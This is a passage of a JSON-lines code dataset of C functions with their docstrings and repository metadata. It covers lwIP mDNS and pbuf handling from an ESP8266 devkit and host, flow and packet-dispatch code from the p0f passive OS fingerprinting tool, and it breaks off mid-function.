*pHostname != 0; ++pHostname) {\n\t\t\t\t*query = *pHostname;\n\t\t\t\t++query;\n\t\t\t\t++n;\n\t\t\t}\n\t\t\t*nptr = n;\n\t\t} while (*pHostname != 0);\n\n\t\t*query++ = DNS_OFFSET_FLAG;\n\t\t*query++ = DNS_DEFAULT_OFFSET;\n\n\t\tans.type = htons(DNS_RRTYPE_SRV);\n\t\tans.class = htons(DNS_RRCLASS_FLUSH_IN);\n\t\tans.ttl = htonl(300);\n\t\tos_strcpy(tmpBuf,service_name);\n\t\tos_strcat(tmpBuf, \".\");\n\t\tos_strcat(tmpBuf, MDNS_LOCAL);\n\t\tlength = os_strlen(tmpBuf) + MDNS_LENGTH_ADD;\n\t\tans.len = htons(SIZEOF_MDNS_SERVICE + length);\n\t\tlength = 0;\n\t\tMEMCPY( query, &ans, SIZEOF_DNS_ANSWER);\n\n\t\t/* resize the query */\n\t\tquery = query + SIZEOF_DNS_ANSWER;\n\n\t\tserv.prior = htons(0);\n\t\tserv.weight = htons(0);\n\t\tserv.port = htons(PUCK_PORT);\n\t\tMEMCPY( query, &serv, SIZEOF_MDNS_SERVICE);\n\t\t/* resize the query */\n\t\tquery = query + SIZEOF_MDNS_SERVICE;\n\n\t\tpHostname = tmpBuf;\n\t\t--pHostname;\n\t\tdo {\n\t\t\t++pHostname;\n\t\t\tnptr = query;\n\t\t\t++query;\n\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t*query = *pHostname;\n\t\t\t\t++query;\n\t\t\t\t++n;\n\t\t\t}\n\t\t\t*nptr = n;\n\t\t} while (*pHostname != 0);\n\t\t*query++ = '\\0';\n\t\t/* set the name of the authority field.\n\t\t * The same name as the Query using the offset address*/\n\t\tos_strcpy(tmpBuf,service_name);\n\t\tos_strcat(tmpBuf, \".\");\n\t\tos_strcat(tmpBuf, MDNS_LOCAL);\n\t\tpHostname = tmpBuf;\n\t\t--pHostname;\n\t\tdo {\n\t\t\t++pHostname;\n\t\t\tnptr = query;\n\t\t\t++query;\n\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t*query = *pHostname;\n\t\t\t\t++query;\n\t\t\t\t++n;\n\t\t\t}\n\t\t\t*nptr = n;\n\t\t} while (*pHostname != 0);\n\t\t*query++ = '\\0';\n\t\t/* set the name of the authority field.\n\t\t * The same name as the Query using the offset address*/\n\t\t//*query++ = DNS_OFFSET_FLAG;\n\t\t//*query++ = DNS_DEFAULT_OFFSET;\n\t\tans.type = htons(DNS_RRTYPE_A);\n\t\tans.class = htons(DNS_RRCLASS_FLUSH_IN);\n\t\tans.ttl = htonl(300);\n\t\tans.len = htons(DNS_IP_ADDR_LEN);\n\n\t\tMEMCPY( query, &ans, SIZEOF_DNS_ANSWER);\n\n\t\t/* resize the query */\n\t\tquery = query + SIZEOF_DNS_ANSWER;\n\n\t\t/* fill the payload of the mDNS message */\n\t\t/* set the local IP address */\n\t\tauth.src = host_addr.addr; //ipAddr;\n\t\tMEMCPY( query, &auth, SIZEOF_MDNS_AUTH);\n\t\t/* resize the query */\n\t\tquery = query + SIZEOF_MDNS_AUTH;\n\n\t\t/* set the name of the authority field.\n\t\t * The same name as the Query using the offset address*/\n\n\t\t/* resize pbuf to the exact dns query */\n\t\tpbuf_realloc(p, (query) - ((char*) (p->payload)));\n\t\t/* send dns packet */\n\t\tsta_netif = (struct netif *)eagle_lwip_getif(0x00);\n\t\tap_netif =  (struct netif *)eagle_lwip_getif(0x01);\n\t\tif(wifi_get_opmode() == 0x03 && wifi_get_broadcast_if() == 0x03 &&\\\n\t\t\t\tsta_netif != NULL && ap_netif != NULL) {\n\t\t\tif(netif_is_up(sta_netif) && netif_is_up(ap_netif)) {\n\n\t\t\t\tp_sta = pbuf_alloc(PBUF_TRANSPORT,\n\t\t\t\t\t\t\tSIZEOF_DNS_HDR + MDNS_MAX_NAME_LENGTH * 2 + SIZEOF_DNS_QUERY, PBUF_RAM);\n\t\t\t  if (pbuf_copy (p_sta,p) != ERR_OK) {\n\t\t\t\t  os_printf(\"mdns_send_service copying to new pbuf failed\\n\");\n\t\t\t\t  return -1;\n\t\t\t  }\n\t\t\t  netif_set_default(sta_netif);\n\t\t\t  err = udp_sendto(mdns_pcb, p_sta, &multicast_addr, DNS_MDNS_PORT);\n\t\t\t  pbuf_free(p_sta);\n\t\t\t  netif_set_default(ap_netif);\n\t\t\t}\n\t\t}\n\t\terr = udp_sendto(mdns_pcb, p, &multicast_addr, DNS_MDNS_PORT);\n\n\t\t/* free pbuf */\n\t\tpbuf_free(p);\n\t} else {\n\t\tos_printf(\"ERR_MEM \\n\");\n\t\terr = ERR_MEM;\n\t}\n\n\treturn err;\n}", "path": "Espressif\\examples\\ESP8266\\lwip_open_demo_app\\app\\lwip\\core\\mdns.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Compare the \"dotted\" name \"query\" with the encoded name \"response\"\n * to make sure an answer from the DNS server matches the current mdns_table\n * entry (otherwise, answers might arrive late for hostname not on the list\n * any more).\n *\n * @param query hostname (not encoded) from the mdns_table\n * @param response encoded hostname in the DNS response\n * @return 0: names equal; 1: names differ\n */\n", "func_signal": "static u8_t ICACHE_FLASH_ATTR\nmdns_compare_name(unsigned char *query, unsigned char *response)", "code": "{\n\tunsigned char n;\n\n\tdo {\n\t\tn = *response++;\n\t\t/** @see RFC 1035 - 4.1.4. Message compression */\n\t\tif ((n & 0xc0) == 0xc0) {\n\t\t\t/* Compressed name */\n\t\t\tbreak;\n\t\t} else {\n\t\t\t/* Not compressed name */\n\t\t\twhile (n > 0) {\n\t\t\t\tif ((*query) != (*response)) {\n\t\t\t\t\treturn 1;\n\t\t\t\t}\n\t\t\t\t++response;\n\t\t\t\t++query;\n\t\t\t\t--n;\n\t\t\t};\n\t\t\t++query;\n\t\t}\n\t} while (*response != 0);\n\n\treturn 0;\n}", "path": "Espressif\\examples\\ESP8266\\lwip_open_demo_app\\app\\lwip\\core\\mdns.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Copy (part of) the contents of a packet buffer\n * to an application supplied buffer.\n *\n * @param buf the pbuf from which to copy data\n * @param dataptr the application supplied buffer\n * @param len length of data to copy (dataptr must be big enough). No more \n * than buf->tot_len will be copied, irrespective of len\n * @param offset offset into the packet buffer from where to begin copying len bytes\n * @return the number of bytes copied, or 0 on failure\n */\n", "func_signal": "u16_t\npbuf_copy_partial(struct pbuf *buf, void *dataptr, u16_t len, u16_t offset)", "code": "{\n  struct pbuf *p;\n  u16_t left;\n  u16_t buf_copy_len;\n  u16_t copied_total = 0;\n\n  LWIP_ERROR(\"pbuf_copy_partial: invalid buf\", (buf != NULL), return 0;);\n  LWIP_ERROR(\"pbuf_copy_partial: invalid dataptr\", (dataptr != NULL), return 0;);\n\n  left = 0;\n\n  if((buf == NULL) || (dataptr == NULL)) {\n    return 0;\n  }\n\n  /* Note some systems use byte copy if dataptr or one of the pbuf payload pointers are unaligned. */\n  for(p = buf; len != 0 && p != NULL; p = p->next) {\n    if ((offset != 0) && (offset >= p->len)) {\n      /* don't copy from this buffer -> on to the next */\n      offset -= p->len;\n    } else {\n      /* copy from this buffer. maybe only partially. */\n      buf_copy_len = p->len - offset;\n      if (buf_copy_len > len)\n          buf_copy_len = len;\n      /* copy the necessary parts of the buffer */\n      MEMCPY(&((char*)dataptr)[left], &((char*)p->payload)[offset], buf_copy_len);\n      copied_total += buf_copy_len;\n      left += buf_copy_len;\n      len -= buf_copy_len;\n      offset = 0;\n    }\n  }\n  return copied_total;\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Increment the reference count of the pbuf.\n *\n * @param p pbuf to increase reference counter of\n *\n */\n", "func_signal": "void\npbuf_ref(struct pbuf *p)", "code": "{\n  SYS_ARCH_DECL_PROTECT(old_level);\n  /* pbuf given? */\n  if (p != NULL) {\n    SYS_ARCH_PROTECT(old_level);\n    ++(p->ref);\n    SYS_ARCH_UNPROTECT(old_level);\n  }\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/** Find occurrence of mem (with length mem_len) in pbuf p, starting at offset\n * start_offset.\n *\n * @param p pbuf to search, maximum length is 0xFFFE since 0xFFFF is used as\n *        return value 'not found'\n * @param mem search for the contents of this buffer\n * @param mem_len length of 'mem'\n * @param start_offset offset into p at which to start searching\n * @return 0xFFFF if substr was not found in p or the index where it was found\n */\n", "func_signal": "u16_t\npbuf_memfind(struct pbuf* p, const void* mem, u16_t mem_len, u16_t start_offset)", "code": "{\n  u16_t i;\n  u16_t max = p->tot_len - mem_len;\n  if (p->tot_len >= mem_len + start_offset) {\n    for(i = start_offset; i <= max; ) {\n      u16_t plus = pbuf_memcmp(p, i, mem, mem_len);\n      if (plus == 0) {\n        return i;\n      } else {\n        i += plus;\n      }\n    }\n  }\n  return 0xFFFF;\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Receive input function for DNS response packets arriving for the dns UDP pcb.\n *\n * @params see udp.h\n */\n", "func_signal": "static void ICACHE_FLASH_ATTR\nmdns_recv(void *arg, struct udp_pcb *pcb, struct pbuf *p, struct ip_addr *addr,\n\t\tu16_t port)", "code": "{\n\tu8_t i;\n\tstruct mdns_hdr *hdr;\n\tu8_t nquestions;\n\tLWIP_UNUSED_ARG(arg);\n\tLWIP_UNUSED_ARG(pcb);\n\tLWIP_UNUSED_ARG(addr);\n\tLWIP_UNUSED_ARG(port);\n\tstruct mdns_info *info = (struct mdns_info *)arg;\n\t/* is the dns message too big ? */\n\tif (p->tot_len > DNS_MSG_SIZE) {\n\t\tLWIP_DEBUGF(DNS_DEBUG, (\"dns_recv: pbuf too big\\n\"));\n\t\t/* free pbuf and return */\n\t\tgoto memerr1;\n\t}\n\n\t/* is the dns message big enough ? */\n\tif (p->tot_len < (SIZEOF_DNS_HDR + SIZEOF_DNS_QUERY + SIZEOF_DNS_ANSWER)) {\n\t\tLWIP_DEBUGF(DNS_DEBUG, (\"dns_recv: pbuf too small\\n\"));\n\t\t/* free pbuf and return */\n\t\tgoto memerr1;\n\t}\n\t/* copy dns payload inside static buffer for processing */\n\tif (pbuf_copy_partial(p, mdns_payload, p->tot_len, 0) == p->tot_len) {\n\t\t/* The ID in the DNS header should be our entry into the name table. */\n\t\thdr = (struct mdns_hdr*) mdns_payload;\n\n\t\ti = htons(hdr->id);\n\t\tif (i < DNS_TABLE_SIZE) {\n\n\t\t\tnquestions = htons(hdr->numquestions);\n\t\t\t//nanswers   = htons(hdr->numanswers);\n\t\t\t/* if we have a question send an answer if necessary */\n\t\t\tif (nquestions > 0) {\n\t\t\t\t/* MDNS_DS_DOES_NAME_CHECK */\n\t\t\t\t/* Check if the name in the \"question\" part match with the name of the MDNS DS service. */\n\t\t\t\tif (mdns_compare_name((unsigned char *) DNS_SD_SERVICE,\n\t\t\t\t\t\t(unsigned char *) mdns_payload + SIZEOF_DNS_HDR) == 0) {\n\t\t\t\t\t/* respond with the puck service*/\n\t\t\t\t\tmdns_answer(MDNS_SD_ANSWER, PUCK_SERVICE, 0);\n\t\t\t\t} else if (mdns_compare_name((unsigned char *) PUCK_SERVICE,\n\t\t\t\t\t\t(unsigned char *) mdns_payload + SIZEOF_DNS_HDR) == 0) {\n\t\t\t\t\t/* respond with the puck service*/\n\t\t\t\t\tmdns_send_service(info, 0);\n\t\t\t\t} else\n\t\t\t\t\tgoto memerr2;\n\t\t\t}\n\t\t}\n\t}\n\tgoto memerr2;\n\tmemerr2:\n\tos_memset(mdns_payload , 0 ,DNS_MSG_SIZE);\n\tmemerr1:\n\t/* free pbuf */\n\tpbuf_free(p);\n\treturn;\n}", "path": "Espressif\\examples\\ESP8266\\lwip_open_demo_app\\app\\lwip\\core\\mdns.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/******************************************************************************\n * FunctionName : user_rf_cal_sector_set\n * Description  : SDK just reversed 4 sectors, used for rf init data and paramters.\n *                We add this function to force users to set rf cal sector, since\n *                we don't know which sector is free in user's application.\n *                sector map for last several sectors : ABCCC\n *                A : rf cal\n *                B : rf init data\n *                C : sdk parameters\n * Parameters   : none\n * Returns      : rf cal sector\n*******************************************************************************/\n", "func_signal": "uint32 ICACHE_FLASH_ATTR\nuser_rf_cal_sector_set(void)", "code": "{\n    enum flash_size_map size_map = system_get_flash_size_map();\n    uint32 rf_cal_sec = 0;\n\n    switch (size_map) {\n        case FLASH_SIZE_4M_MAP_256_256:\n            rf_cal_sec = 128 - 5;\n            break;\n\n        case FLASH_SIZE_8M_MAP_512_512:\n            rf_cal_sec = 256 - 5;\n            break;\n\n        case FLASH_SIZE_16M_MAP_512_512:\n        case FLASH_SIZE_16M_MAP_1024_1024:\n            rf_cal_sec = 512 - 5;\n            break;\n\n        case FLASH_SIZE_32M_MAP_512_512:\n        case FLASH_SIZE_32M_MAP_1024_1024:\n            rf_cal_sec = 1024 - 5;\n            break;\n\n        case FLASH_SIZE_64M_MAP_1024_1024:\n            rf_cal_sec = 2048 - 5;\n            break;\n        case FLASH_SIZE_128M_MAP_1024_1024:\n            rf_cal_sec = 4096 - 5;\n            break;\n        default:\n            rf_cal_sec = 0;\n            break;\n    }\n\n    return rf_cal_sec;\n}", "path": "Espressif\\examples\\ESP8266\\wifi-sniffer\\user\\user_main.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Shrink a pbuf chain to a desired length.\n *\n * @param p pbuf to shrink.\n * @param new_len desired new length of pbuf chain\n *\n * Depending on the desired length, the first few pbufs in a chain might\n * be skipped and left unchanged. The new last pbuf in the chain will be\n * resized, and any remaining pbufs will be freed.\n *\n * @note If the pbuf is ROM/REF, only the ->tot_len and ->len fields are adjusted.\n * @note May not be called on a packet queue.\n *\n * @note Despite its name, pbuf_realloc cannot grow the size of a pbuf (chain).\n */\n", "func_signal": "void\npbuf_realloc(struct pbuf *p, u16_t new_len)", "code": "{\n  struct pbuf *q;\n  u16_t rem_len; /* remaining length */\n  s32_t grow;\n\n  LWIP_ASSERT(\"pbuf_realloc: p != NULL\", p != NULL);\n  LWIP_ASSERT(\"pbuf_realloc: sane p->type\", p->type == PBUF_POOL ||\n              p->type == PBUF_ROM ||\n              p->type == PBUF_RAM ||\n              p->type == PBUF_REF);\n\n  /* desired length larger than current length? */\n  if (new_len >= p->tot_len) {\n    /* enlarging not yet supported */\n    return;\n  }\n\n  /* the pbuf chain grows by (new_len - p->tot_len) bytes\n   * (which may be negative in case of shrinking) */\n  grow = new_len - p->tot_len;\n\n  /* first, step over any pbufs that should remain in the chain */\n  rem_len = new_len;\n  q = p;\n  /* should this pbuf be kept? */\n  while (rem_len > q->len) {\n    /* decrease remaining length by pbuf length */\n    rem_len -= q->len;\n    /* decrease total length indicator */\n    LWIP_ASSERT(\"grow < max_u16_t\", grow < 0xffff);\n    q->tot_len += (u16_t)grow;\n    /* proceed to next pbuf in chain */\n    q = q->next;\n    LWIP_ASSERT(\"pbuf_realloc: q != NULL\", q != NULL);\n  }\n  /* we have now reached the new last pbuf (in q) */\n  /* rem_len == desired length for pbuf q */\n\n  /* shrink allocated memory for PBUF_RAM */\n  /* (other types merely adjust their length fields */\n  if ((q->type == PBUF_RAM) && (rem_len != q->len)) {\n    /* reallocate and adjust the length of the pbuf that will be split */\n    q = (struct pbuf *)mem_trim(q, (u16_t)((u8_t *)q->payload - (u8_t *)q) + rem_len);\n    LWIP_ASSERT(\"mem_trim returned q == NULL\", q != NULL);\n  }\n  /* adjust length fields for new last pbuf */\n  q->len = rem_len;\n  q->tot_len = q->len;\n\n  /* any remaining pbufs in chain? */\n  if (q->next != NULL) {\n    /* free remaining pbufs in chain */\n    pbuf_free(q->next);\n  }\n  /* q is last packet in chain */\n  q->next = NULL;\n\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Creates a single pbuf out of a queue of pbufs.\n *\n * @remark: Either the source pbuf 'p' is freed by this function or the original\n *          pbuf 'p' is returned, therefore the caller has to check the result!\n *\n * @param p the source pbuf\n * @param layer pbuf_layer of the new pbuf\n *\n * @return a new, single pbuf (p->next is NULL)\n *         or the old pbuf if allocation fails\n */\n", "func_signal": "struct pbuf*\npbuf_coalesce(struct pbuf *p, pbuf_layer layer)", "code": "{\n  struct pbuf *q;\n  err_t err;\n  if (p->next == NULL) {\n    return p;\n  }\n  q = pbuf_alloc(layer, p->tot_len, PBUF_RAM);\n  if (q == NULL) {\n    /* @todo: what do we do now? */\n    return p;\n  }\n  err = pbuf_copy(q, p);\n  LWIP_ASSERT(\"pbuf_copy failed\", err == ERR_OK);\n  pbuf_free(p);\n  return q;\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/* Calculate hash bucket for host_data. */\n", "func_signal": "static u32 get_host_bucket(u8* addr, u8 ip_ver)", "code": "{\n\n  u32 bucket;\n\n  bucket = hash32(addr, (ip_ver == IP_VER4) ? 4 : 16, hash_seed);\n\n  return bucket % HOST_BUCKETS;\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Calculate hash bucket for packet_flow. Keep the hash symmetrical: switching\n   source and dest should have no effect. */\n", "func_signal": "static u32 get_flow_bucket(struct packet_data* pk)", "code": "{\n\n  u32 bucket;\n\n  if (pk->ip_ver == IP_VER4) {\n    bucket = hash32(pk->src, 4, hash_seed) ^ hash32(pk->dst, 4, hash_seed);\n  } else {\n    bucket = hash32(pk->src, 16, hash_seed) ^ hash32(pk->dst, 16, hash_seed);\n  }\n\n  bucket ^= hash32(&pk->sport, 2, hash_seed) ^ hash32(&pk->dport, 2, hash_seed);\n\n  return bucket % FLOW_BUCKETS;\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Clean up everything. */\n", "func_signal": "void destroy_all_hosts(void)", "code": "{\n\n  while (flow_by_age) destroy_flow(flow_by_age);\n  while (host_by_age) destroy_host(host_by_age);\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Verify if tool class (called from modules). */\n", "func_signal": "void verify_tool_class(u8 to_srv, struct packet_flow* f, u32* sys, u32 sys_cnt)", "code": "{\n\n  struct host_data* hd;\n  u32 i;\n\n  if (to_srv) hd = f->client; else hd = f->server;\n\n  CP(sys);\n\n  /* No existing data; although there is perhaps some value in detecting\n     app-only conflicts in absence of other info, it's probably OK to just\n     wait until more data becomes available. */\n\n  if (hd->last_class_id == -1) return;\n\n  for (i = 0; i < sys_cnt; i++)\n\n    if ((sys[i] & SYS_CLASS_FLAG)) {\n\n      if (SYS_NF(sys[i]) == hd->last_class_id) break;\n\n    } else {\n\n      if (SYS_NF(sys[i]) == hd->last_name_id) break;\n\n    }\n\n  /* Oops, a mismatch. */\n\n  if (i == sys_cnt) {\n\n    DEBUG(\"[#] Detected app not supposed to run on host OS.\\n\");\n    add_nat_score(to_srv, f, NAT_APP_SIG, 4);\n\n  } else {\n\n    DEBUG(\"[#] Detected app supported on host OS.\\n\");\n    add_nat_score(to_srv, f, 0, 0);\n\n  }\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Create a minimal host data. */\n", "func_signal": "static struct host_data* create_host(u8* addr, u8 ip_ver)", "code": "{\n\n  u32 bucket = get_host_bucket(addr, ip_ver);\n  struct host_data* nh;\n\n  if (host_cnt > max_hosts) nuke_hosts();\n\n  DEBUG(\"[#] Creating host data: %s (bucket %u)\\n\",\n        addr_to_str(addr, ip_ver), bucket);\n\n  nh = ck_alloc(sizeof(struct host_data));\n\n  /* Insert into the bucketed linked list. */\n\n  if (CP(host_b[bucket])) {\n    host_b[bucket]->prev = nh;\n    nh->next = host_b[bucket];\n  }\n\n  host_b[bucket] = nh;\n\n  /* Insert into the by-age linked list. */\n \n  if (CP(newest_host)) {\n\n    newest_host->newer = nh;\n    nh->older = newest_host;\n\n  } else host_by_age = nh;\n\n  newest_host = nh;\n\n  /* Populate other data. */\n\n  nh->ip_ver = ip_ver;\n  memcpy(nh->addr, addr, (ip_ver == IP_VER4) ? 4 : 16);\n\n  nh->last_seen = nh->first_seen = get_unix_time();\n\n  nh->last_up_min     = -1;\n  nh->last_class_id   = -1;\n  nh->last_name_id    = -1;\n  nh->http_name_id    = -1;\n  nh->distance        = -1;\n\n  host_cnt++;\n\n  return nh;\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Indiscriminately kill some of the oldest flows. */\n", "func_signal": "static void nuke_flows(u8 silent)", "code": "{\n\n  u32 kcnt = 1 + (flow_cnt * KILL_PERCENT / 100);\n\n  if (silent)\n    DEBUG(\"[#] Pruning connections - trying to delete %u...\\n\",kcnt);\n  else if (!read_file)\n    WARN(\"Too many tracked connections, deleting %u. \"\n         \"Use -m to adjust.\", kcnt);\n\n  while (kcnt-- && flow_by_age) destroy_flow(flow_by_age);\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Parse IPv4 address into a buffer. */\n", "func_signal": "static void parse_addr(char* str, u8* ret)", "code": "{ \n\n  u32 a1, a2, a3, a4;\n\n  if (sscanf(str, \"%u.%u.%u.%u\", &a1, &a2, &a3, &a4) != 4)\n    FATAL(\"Malformed IPv4 address.\");\n\n  if (a1 > 255 || a2 > 255 || a3 > 255 || a4 > 255)\n    FATAL(\"Malformed IPv4 address.\");\n\n  ret[0] = a1;\n  ret[1] = a2;\n  ret[2] = a3;\n  ret[3] = a4;\n\n}", "path": "tools\\p0f-sendsyn.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Indiscriminately kill some of the older hosts. */\n", "func_signal": "static void nuke_hosts(void)", "code": "{\n\n  u32 kcnt = 1 + (host_cnt * KILL_PERCENT / 100);\n  struct host_data* target = host_by_age;\n\n  if (!read_file)\n    WARN(\"Too many host entries, deleting %u. Use -m to adjust.\", kcnt);\n\n  nuke_flows(1);\n\n  while (kcnt && CP(target)) {\n    struct host_data* next = target->older;\n    if (!target->use_cnt) { kcnt--; destroy_host(target); }\n    target = next;\n  }\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Touch host data to make it more recent. */\n", "func_signal": "static void touch_host(struct host_data* h)", "code": "{\n\n  CP(h);\n\n  DEBUG(\"[#] Refreshing host data: %s\\n\", addr_to_str(h->addr, h->ip_ver));\n\n  if (h != CP(newest_host)) {\n\n    /* Remove from the the by-age linked list. */\n\n    CP(h->newer);\n    h->newer->older = h->older;\n\n    if (CP(h->older)) h->older->newer = h->newer;\n    else host_by_age = h->newer; \n\n    /* Re-insert in front. */\n\n    newest_host->newer = h;\n    h->older = newest_host;\n    h->newer = NULL;\n\n    newest_host = h;\n\n    /* This wasn't the only entry on the list, so there is no\n       need to update the tail (host_by_age). */\n\n  }\n\n  /* Update last seen time. */\n\n  h->last_seen = get_unix_time();\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Destroy host data. */\n", "func_signal": "static void destroy_host(struct host_data* h)", "code": "{\n\n  u32 bucket; \n\n  bucket = get_host_bucket(CP(h)->addr, h->ip_ver);\n\n  if (h->use_cnt) FATAL(\"Attempt to destroy used host data.\");\n\n  DEBUG(\"[#] Destroying host data: %s (bucket %d)\\n\",\n        addr_to_str(h->addr, h->ip_ver), bucket);\n\n  /* Remove it from the bucketed linked list. */\n\n  if (CP(h->next)) h->next->prev = h->prev;\n  \n  if (CP(h->prev)) h->prev->next = h->next;\n  else host_b[bucket] = h->next;\n\n  /* Remove from the by-age linked list. */\n\n  if (CP(h->newer)) h->newer->older = h->older;\n  else newest_host = h->older;\n\n  if (CP(h->older)) h->older->newer = h->newer;\n  else host_by_age = h->newer; \n\n  /* Free memory. */\n\n  ck_free(h->last_syn);\n  ck_free(h->last_synack);\n\n  ck_free(h->http_resp);\n  ck_free(h->http_req_os);\n\n  ck_free(h);\n\n  host_cnt--;\n\n}", "path": "process.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Do a basic IPv4 TCP checksum. */\n", "func_signal": "static void tcp_cksum(u8* src, u8* dst, struct tcp_hdr* t, u8 opt_len)", "code": "{\n\n  u32 sum, i;\n  u8* p;\n\n  if (opt_len % 4) FATAL(\"Packet size not aligned to 4.\");\n\n  t->cksum = 0;\n\n  sum = PROTO_TCP + sizeof(struct tcp_hdr) + opt_len;\n\n  p = (u8*)t;\n\n  for (i = 0; i < sizeof(struct tcp_hdr) + opt_len; i += 2, p += 2)\n    sum += (*p << 8) + p[1];\n\n  p = src;\n\n  for (i = 0; i < 4; i += 2, p += 2) sum += (*p << 8) + p[1];\n\n  p = dst;\n\n  for (i = 0; i < 4; i += 2, p += 2) sum += (*p << 8) + p[1];\n\n  t->cksum = htons(~(sum + (sum >> 16)));\n\n}", "path": "tools\\p0f-sendsyn.c", "repo_name": "p0f/p0f", "stars": 420, "license": "None", "language": "c", "size": 424}
{"docstring": "/* Insert data from a packet into a flow, call handlers as appropriate. */\n", "func_signal": "static void flow_dispatch(struct packet_data* pk)", "code": "{\n\n  struct packet_flow* f;\n  struct tcp_sig* tsig;\n  u8 to_srv = 0;\n  u8 need_more = 0;\n\n  DEBUG(\"[#] Received TCP packet: %s/%u -> \",\n        addr_to_str(pk->src, pk->ip_ver), pk->sport);\n\n  DEBUG(\"%s/%u (type 0x%02x, pay_len = %u)\\n\",\n        addr_to_str(pk->dst, pk->ip_ver), pk->dport, pk->tcp_type,\n        pk->pay_len);\n    \n  f = lookup_flow(pk, &to_srv);\n\n  switch (pk->tcp_type) {\n\n    case TCP_SYN:\n\n      if (f) {\n\n        /* Perhaps just a simple dupe? */\n        if (to_srv && f->next_cli_seq - 1 == pk->seq) return;\n\n        DEBUG(\"[#] New SYN for an existing flow, resetting.\\n\");\n        destroy_flow(f);\n\n      }\n\n      f = create_flow_from_syn(pk);\n\n      tsig = fingerprint_tcp(1, pk, f);\n\n      /* We don't want to do any further processing on generic non-OS\n         signatures (e.g. NMap). The easiest way to guarantee that is to \n         kill the flow. */\n\n      if (!tsig && !f->sendsyn) {\n\n        destroy_flow(f);\n        return;\n\n      }\n\n      fingerprint_mtu(1, pk, f);\n      check_ts_tcp(1, pk, f);\n\n      if (tsig) {\n\n        /* This can't be done in fingerprint_tcp because check_ts_tcp()\n           depends on having original SYN / SYN+ACK data. */\n \n        ck_free(f->client->last_syn);\n        f->client->last_syn = tsig;\n\n      }\n\n      break;\n\n    case TCP_SYN | TCP_ACK:\n\n      if (!f) {\n\n        DEBUG(\"[#] Stray SYN+ACK with no flow.\\n\");\n        return;\n\n      }\n\n      /* This is about as far as we want to go with p0f-sendsyn. */\n\n      if (f->sendsyn) {\n\n        fingerprint_tcp(0, pk, f);\n        destroy_flow(f);\n        return;\n\n      }\n\n\n      if (to_srv) {\n\n        DEBUG(\"[#] SYN+ACK from client to server, trippy.\\n\");\n        return;\n\n      }\n\n      if (f->acked) {\n\n        if (f->next_srv_seq - 1 != pk->seq)\n          DEBUG(\"[#] Repeated but non-identical SYN+ACK (0x%08x != 0x%08x).\\n\",\n                f->next_srv_seq - 1, pk->seq);\n\n        return;\n\n      }\n\n      f->acked = 1;\n\n      tsig = fingerprint_tcp(0, pk, f);\n\n      /* SYN from real OS, SYN+ACK from a client stack. Weird, but whatever. */\n\n      if (!tsig) {\n\n        destroy_flow(f);\n        return;\n\n      }\n\n      fingerprint_mtu(0, pk, f);\n      check_ts_tcp(0, pk, f);\n\n      ck_free(f->server->last_synack);\n      f->server->last_synack = tsig;\n\n      f->next_srv_seq = pk->seq + 1;\n\n      break;\n\n    case TCP_RST | TCP_ACK:\n    case TCP_RST:\n    case TCP_FIN | TCP_ACK:\n    case TCP_FIN:\n\n       if (f) {\n\n         check_ts_tcp(to_srv, pk, f);\n         destroy_flow(f);\n\n       }\n\n       break;\n\n    case TCP_ACK:\n\n      if (!f) return;\n\n      /* Stop there, you criminal scum! */\n\n      if (f->sendsyn) {\n        destroy_flow(f);\n        return;\n      }\n\n      if (!f->acked) {\n\n        DEBUG(\"[#] Never received SYN+ACK to complete handshake, huh.\\n\");\n        destroy_flow(f);\n        return;\n\n      }\n\n      if (to_srv) {\n\n        /* We don't do stream reassembly, so if something arrives out of order,\n           we won't catch it. Oh well. */\n\n        if (f->next_cli_seq != pk->seq) {\n\n          /* Not a simple dupe? */\n\n          if 